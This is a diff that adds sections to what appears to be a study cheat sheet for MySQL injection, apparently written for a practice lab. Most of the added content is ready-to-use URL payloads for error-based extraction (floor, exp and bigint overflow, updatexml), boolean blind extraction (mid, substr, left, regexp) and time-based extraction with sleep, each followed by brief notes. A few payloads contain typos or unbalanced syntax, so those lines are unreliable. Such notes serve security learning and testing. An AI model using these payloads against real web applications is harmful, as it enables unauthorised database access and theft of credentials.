@@ -100,9 +100,106 @@ Finally, you got the "id,username,password" columns in table users.
 
 ## 2. Error-based Injection
 
+### 2.1 floor
+
+```
+?id=1' union select 1,count(*),concat(0x3a,(select user()),0x3a) a from information_schema.columns group by a--+
+```
+Replace the (select user()) to others to upload payload.
+
+### 2.2 Double out of range
+```
+?id=1' union select (exp(~(select * from (select user())a))),2,3 --+
+```
+Same as floor, replace the (select user())
+
+### 2.3 *Bigint overflow
+```
+?id=1' union select 1,(!(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)-~0),3 --+
+```
+Here 'a' is alias.
+
+### 2.4 *Xpath
+
+There is function called *updatexml* used to update xml doc.
+> Usage: updatexml(target_xml_doc, xml_path, content)
+
+```
+?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e),1)--+
+```
+You can also use group_concat(table_name) without limit 0,1, but notice that updatexml error can only return 32 char once.
+
+Use **substr** to show the full content in several times
+```
+?id=1' and updatexml(1,substr(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),30),1)--+
+```
+
 ## 3. Boolean Blind Injection
 
+### 3.1 string interception
+
+#### 3.1.1 MID
+
+> Usage: mid(column_name, start[, length])
+> If don't have length argument, mid will return all content begin with start
+
+Note that the start begin index with 1 while LIMIT begin with 0
+
+```
+?id=1' and mid((select tables from information_schema.tables where table_schema=database() LIMIT 0,1),1,1)>'a' --+
+```
+
+In some case you may need to use ascii value instead of 'a'.(such as the forbidden of single quote)
+
+Use ord() or ascii() function to compare:
+
+```
+?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=101 --+
+```
+
+#### 3.1.2 Substr
+
+The usage of substr is same as mid.
+
+#### 3.1.3 left
+
+Similar to mid.
+> left(database(),1)>'s'
+
+Use dictionary order to compare:
+> left(database(),3)>'us'
+
+### 3.2 regexp injection
+
+Return 1 if match correctly, else 0.
+
+regexp can always use with *if*
+> if(expression, epx1, epx2)
+
+if expression right return epx1, else epx2
+```
+select * from users where id = 1 and 1 = (user() regexp '^us');
+select * from users where id = 1 and 1 = (if(user() regexp '^us'),1,0)
+```
+
+We match 'user' follow a certain order like this:
+'^[a-z]' -> '^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' > '^user[a-z]' > FALSE
+```
+?id=1' and 1=(select 1 from information_schema.tables where table_schema='securiy' and table_name regexp '^u[a-z]' LIMIT 0,1) --+
+```
+Note that LIMIT 0,1 is necessary otherwise an (subquery returns more than 1 row) error will occur.
+
 ## 4. Time Blind Injection
+
+### 4.1 sleep()
+
+> sleep() function always use with if
+
+```
+?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+```
+
+method 2: use benchmark()
 
 
 
